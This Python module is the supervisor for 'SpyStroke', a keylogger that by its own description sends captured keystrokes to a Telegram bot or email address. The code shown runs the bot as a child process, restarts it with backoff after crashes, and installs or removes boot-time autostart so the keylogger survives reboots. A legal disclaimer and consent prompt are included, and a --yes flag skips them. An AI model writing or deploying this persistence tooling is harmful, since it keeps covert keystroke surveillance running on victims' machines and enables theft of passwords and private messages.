"""Supervised execution and auto-start for SpyStroke bots.

The supervisor runs a bot entry point as a child process and restarts it if
it exits unexpectedly, so the keylogger survives crashes and reboots.  It
also registers (and unregisters) the bot to start automatically at boot via
:mod:`spystroke.autostart`.

CLI usage (from the repository root)::

    python -m spystroke.supervisor run telegram     # run supervised (foreground)
    python -m spystroke.supervisor run email
    python -m spystroke.supervisor install telegram  # register on boot
    python -m spystroke.supervisor uninstall telegram
    python -m spystroke.supervisor status

State (pid files, logs) lives in ``~/.spystroke/``.
"""

from __future__ import annotations

import argparse
import logging
import os
import signal
import subprocess
import sys
import threading
import time
from pathlib import Path
from typing import Optional

# Allow running as a plain script: ``python spystroke/supervisor.py``.
if __package__ in (None, ""):
    sys.path.insert(0, str(Path(__file__).resolve().parent.parent))

import spystroke  # noqa: E402
from spystroke.autostart import (  # noqa: E402
    autostart_installed,
    install_autostart,
    uninstall_autostart,
)

logger = logging.getLogger("spystroke.supervisor")

#: Bot entry points keyed by the names accepted on the CLI.
ENTRY_POINTS: dict[str, str] = {
    "telegram": "telegram/bot.py",
    "email": "email/main.py",
}

#: Printed before any command that starts monitoring or installs persistence.
DISCLAIMER = (
    "\n[!] LEGAL DISCLAIMER\n"
    "SpyStroke captures keystrokes and exfiltrates them to a Telegram bot or "
    "email address.\n"
    "Use it ONLY on devices you own or have explicit written permission to "
    "monitor.\n"
    "Unauthorized monitoring is illegal in most jurisdictions and violates "
    "the privacy of others.\n"
    "By continuing you confirm that you are authorized to do this.\n"
)


def _confirm_consent(force_yes: bool) -> bool:
    """Print the disclaimer and require explicit consent to start monitoring.

    ``force_yes`` (the ``--yes`` flag) skips the interactive prompt, for
    scripts. In non-interactive contexts (CI, pipes) consent is never
    assumed: the run aborts unless ``--yes`` was passed.
    """
    print(DISCLAIMER)
    if force_yes:
        return True
    if not sys.stdin.isatty():
        print(
            "Non-interactive run: pass --yes to confirm you are authorized.",
            file=sys.stderr,
        )
        return False
    answer = (
        input("Type 'yes' to confirm you are authorized to monitor this device: ")
        .strip()
        .lower()
    )
    return answer == "yes"

#: How often the supervisor checks on the child (seconds).
_POLL_INTERVAL = 0.5
#: How long to wait for a graceful child shutdown before escalating.
_GRACE_PERIOD = 5.0


def repo_root() -> Path:
    """Absolute path of the repository root."""
    return Path(spystroke.__file__).resolve().parent.parent


def state_dir() -> Path:
    """Directory holding pid files and logs (``~/.spystroke``)."""
    return Path.home() / ".spystroke"


class Supervisor:
    """Runs a bot entry point and restarts it if it exits unexpectedly.

    Restart behaviour:

    * restarts are delayed with exponential backoff (capped at
      ``max_delay``) when the child keeps dying quickly, so a crash loop
      (e.g. a misconfigured token) cannot hammer the CPU or the network;
    * the backoff resets once the child has stayed up for
      ``healthy_uptime`` seconds;
    * ``max_restarts`` bounds the loop (used by tests and as a safety
      valve; ``None`` means run forever).
    """

    def __init__(
        self,
        name: str,
        entry_script: Path,
        *,
        state_dir_override: Optional[Path] = None,
        log_file: Optional[Path] = None,
        restart_delay: float = 1.0,
        max_delay: float = 60.0,
        healthy_uptime: float = 30.0,
        max_restarts: Optional[int] = None,
        install_signal_handlers: bool = True,
        poll_interval: float = _POLL_INTERVAL,
    ) -> None:
        self.name = name
        self.entry_script = entry_script
        self.state_dir = state_dir_override or state_dir()
        self.restart_delay = restart_delay
        self.max_delay = max_delay
        self.healthy_uptime = healthy_uptime
        self.max_restarts = max_restarts
        self.install_signal_handlers = install_signal_handlers
        self.poll_interval = poll_interval

        self._pid_file = self.state_dir / f"spystroke-{self.name}.pid"
        self._log_file = log_file or (self.state_dir / f"spystroke-{self.name}.log")
        self._stop = threading.Event()
        self._old_handlers: dict[int, object] = {}

        #: Number of restarts performed during the last run().
        self.restarts = 0
        #: The most recently spawned child process (or None).
        self.child: Optional[subprocess.Popen] = None
        #: Current backoff delay (grows on crash loops, resets when healthy).
        self._current_delay = restart_delay

    # -- public API ---------------------------------------------------------

    def run(self) -> int:
        """Run the supervision loop until stopped. Returns an exit code."""
        if self._pid_alive():
            logger.error(
                "A supervisor for '%s' is already running (pid %s).",
                self.name,
                self._read_pid(),
            )
            return 1

        self.state_dir.mkdir(parents=True, exist_ok=True)
        self._write_pid()
        self._install_handlers()
        try:
            while not self._stop.is_set():
                self._spawn_and_wait()
                if self._stop.is_set():
                    break
                if (
                    self.max_restarts is not None
                    and self.restarts >= self.max_restarts
                ):
                    logger.info(
                        "Reached max_restarts=%d, giving up", self.max_restarts
                    )
                    break
                self._sleep_interruptible(self._current_delay)
        finally:
            self._restore_handlers()
            self._remove_pid()
        return 0

    def request_stop(self) -> None:
        """Ask the supervisor to stop (from any thread)."""
        self._stop.set()

    # -- internals ----------------------------------------------------------

    def _spawn_and_wait(self) -> None:
        started = time.monotonic()
        with self._log_file.open("a", encoding="utf-8") as logf:
            self.child = subprocess.Popen(
                [sys.executable, str(self.entry_script)],
                cwd=str(repo_root()),
                env={**os.environ, "PYTHONUNBUFFERED": "1"},
                stdin=subprocess.DEVNULL,
                stdout=logf,
                stderr=logf,
            )
        logger.info(
            "Started child pid %d (restart #%d)", self.child.pid, self.restarts
        )

        while not self._stop.is_set():
            code = self.child.poll()
            if code is not None:
                break
            time.sleep(self.poll_interval)

        if self._stop.is_set():
            self._terminate_gracefully(self.child)
            return

        uptime = time.monotonic() - started
        logger.warning("Child exited with code %s after %.1fs", code, uptime)
        self.restarts += 1
        if uptime >= self.healthy_uptime:
            self._current_delay = self.restart_delay
        else:
            self._current_delay = min(self._current_delay * 2, self.max_delay)

    def _terminate_gracefully(self, proc: subprocess.Popen) -> None:
        """Stop the child, escalating SIGINT -> terminate -> kill."""
        if proc.poll() is not None:
            return
        if os.name == "posix":
            try:
                proc.send_signal(signal.SIGINT)
                proc.wait(timeout=_GRACE_PERIOD)
                return
            except (subprocess.TimeoutExpired, ProcessLookupError, OSError):
                pass
        try:
            proc.terminate()
            proc.wait(timeout=_GRACE_PERIOD)
        except (subprocess.TimeoutExpired, ProcessLookupError, OSError):
            try:
                proc.kill()
            except (ProcessLookupError, OSError):  # pragma: no cover
                pass

    def _sleep_interruptible(self, seconds: float) -> None:
        end = time.monotonic() + seconds
        while not self._stop.is_set() and time.monotonic() < end:
            time.sleep(min(self.poll_interval, 0.25))

    def _install_handlers(self) -> None:
        if not self.install_signal_handlers:
            return
        for sig in (signal.SIGINT, getattr(signal, "SIGTERM", None)):
            if sig is None:
                continue
            try:
                self._old_handlers[sig] = signal.getsignal(sig)
                signal.signal(sig, lambda *_: self.request_stop())
            except (ValueError, OSError):  # pragma: no cover - main thread only
                pass

    def _restore_handlers(self) -> None:
        for sig, handler in self._old_handlers.items():
            try:
                signal.signal(sig, handler)
            except (ValueError, OSError):  # pragma: no cover
                pass
        self._old_handlers.clear()

    # -- pid file helpers ---------------------------------------------------

    def _write_pid(self) -> None:
        self._pid_file.write_text(str(os.getpid()), encoding="utf-8")

    def _read_pid(self) -> Optional[int]:
        try:
            return int(self._pid_file.read_text(encoding="utf-8").strip())
        except (OSError, ValueError):
            return None

    def _remove_pid(self) -> None:
        try:
            self._pid_file.unlink()
        except OSError:
            pass

    def _pid_alive(self) -> bool:
        pid = self._read_pid()
        if pid is None:
            return False
        try:
            os.kill(pid, 0)
            return True
        except (ProcessLookupError, PermissionError, OSError):
            return False


# ---------------------------------------------------------------------------
# CLI
# ---------------------------------------------------------------------------

def _setup_logging() -> None:
    state_dir().mkdir(parents=True, exist_ok=True)
    handlers = [logging.FileHandler(state_dir() / "supervisor.log", encoding="utf-8")]
    if sys.stderr is not None:
        handlers.append(logging.StreamHandler())
    logging.basicConfig(
        level=logging.INFO,
        format="%(asctime)s [%(levelname)s] %(name)s: %(message)s",
        handlers=handlers,
    )


def _build_parser() -> argparse.ArgumentParser:
    parser = argparse.ArgumentParser(
        prog="spystroke.supervisor",
        description="Run SpyStroke bots supervised and register them on boot.",
    )
    sub = parser.add_subparsers(dest="command", required=True)

    run_p = sub.add_parser("run", help="Run a bot under supervision (foreground).")
    run_p.add_argument("name", choices=sorted(ENTRY_POINTS))
    run_p.add_argument(
        "--yes",
        action="store_true",
        help="Skip the consent prompt (required when stdin is not a terminal)",
    )

    install_p = sub.add_parser("install", help="Register a bot to start at boot.")
    install_p.add_argument("name", choices=sorted(ENTRY_POINTS))
    install_p.add_argument(
        "--yes",
        action="store_true",
        help="Skip the consent prompt (required when stdin is not a terminal)",
    )

    uninstall_p = sub.add_parser("uninstall", help="Remove boot registration.")
    uninstall_p.add_argument("name", choices=sorted(ENTRY_POINTS))

    sub.add_parser("status", help="Show supervisor and auto-start status.")
    return parser


def main(argv: Optional[list[str]] = None) -> int:
    args = _build_parser().parse_args(argv)
    _setup_logging()

    # Starting to monitor (run) or installing boot persistence (install) both
    # require explicit consent; status/uninstall do not start monitoring.
    if args.command in ("run", "install") and not _confirm_consent(args.yes):
        print("Aborted: consent not confirmed.", file=sys.stderr)
        return 1

    if args.command == "run":
        entry = repo_root() / ENTRY_POINTS[args.name]
        if not entry.exists():
            logger.error("Entry point not found: %s", entry)
            print(f"Error: {entry} does not exist.", file=sys.stderr)
            return 1
        supervisor = Supervisor(args.name, entry)
        return supervisor.run()

    if args.command == "install":
        target = install_autostart(args.name)
        print(f"Auto-start registered for '{args.name}' -> {target}")
        print("Run 'python -m spystroke.supervisor run %s' to start it now." % args.name)
        return 0

    if args.command == "uninstall":
        removed = uninstall_autostart(args.name)
        if removed:
            print(f"Auto-start removed for '{args.name}'.")
        else:
            print(f"No auto-start registration found for '{args.name}'.")
        return 0

    if args.command == "status":
        for name in sorted(ENTRY_POINTS):
            pf = state_dir() / f"spystroke-{name}.pid"
            pid = None
            try:
                pid = int(pf.read_text(encoding="utf-8").strip())
            except (OSError, ValueError):
                pid = None
            alive = False
            if pid is not None:
                try:
                    os.kill(pid, 0)
                    alive = True
                except (ProcessLookupError, PermissionError, OSError):
                    alive = False
            autostart = autostart_installed(name)
            print(f"{name:10s} supervisor={'running (pid %d)' % pid if alive else 'stopped':17s} autostart={'yes' if autostart else 'no'}")
        return 0

    return 2  # pragma: no cover - argparse enforces a subcommand


if __name__ == "__main__":
    raise SystemExit(main())
